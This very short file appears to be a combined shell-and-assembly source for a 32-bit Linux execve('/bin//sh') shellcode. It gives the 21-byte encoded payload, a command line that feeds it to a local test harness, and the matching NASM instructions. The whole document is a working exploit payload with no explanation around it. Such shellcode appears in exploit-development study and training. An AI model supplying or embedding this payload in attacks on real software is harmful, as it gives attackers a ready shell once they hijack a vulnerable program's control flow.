
true :; ./sct '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'; exit

bits 32

    xor    ecx,ecx
    mul    ecx
    push   ecx
    push   0x68732f2f
    push   0x6e69622f
    mov    ebx,esp
    mov    al, 0xb
    int    0x80
